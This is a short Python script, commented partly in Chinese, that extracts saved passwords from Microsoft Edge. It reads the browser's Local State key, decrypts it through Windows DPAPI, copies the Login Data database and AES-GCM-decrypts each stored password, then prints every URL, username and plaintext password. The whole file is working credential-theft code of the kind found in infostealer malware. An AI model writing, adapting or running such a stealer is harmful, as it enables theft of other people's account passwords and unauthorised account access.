# coding: utf-8
import sqlite3
import shutil
from Crypto.Cipher import AES	# pip3 install pycryptodome
# from Cryptodome.Cipher import AES
import base64
import os,json
import win32crypt


with open(r"%s\AppData\Local\Microsoft\Edge\User Data\Local State"%(os.environ['USERPROFILE']), "r", encoding='utf-8') as f:
	local_state = f.read()
	local_state = json.loads(local_state)
	secret_key = local_state["os_crypt"]["encrypted_key"]

secret_key = base64.b64decode(secret_key)
secret_key = secret_key[5:] 
secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
print(secret_key)

chrome_path_login_db = r"%s\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"%(os.environ['USERPROFILE'])
shutil.copy2(chrome_path_login_db, "Loginvault.db")
conn = sqlite3.connect("Loginvault.db")
cursor = conn.cursor()

cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
for index,login in enumerate(cursor.fetchall()):
	url = login[0]
	username = login[1]
	ciphertext= login[2]
	print("Cipher Text",ciphertext)
	print("Url:",url)
	print("Username:",username)
	
	# Step 1：从密文中提取初始化向量
	initialisation_vector = ciphertext[3:15]
	# Step 2：从密文中提取加密密码
	encrypted_password = ciphertext[15:-16]
	# Step 3：构建AES算法来解密密码
	cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
	decrypted_pass = cipher.decrypt(encrypted_password)
	decrypted_pass = decrypted_pass.decode()
	# Step 4：解密密码
	print("Password:",decrypted_pass)
	print("*"*50)
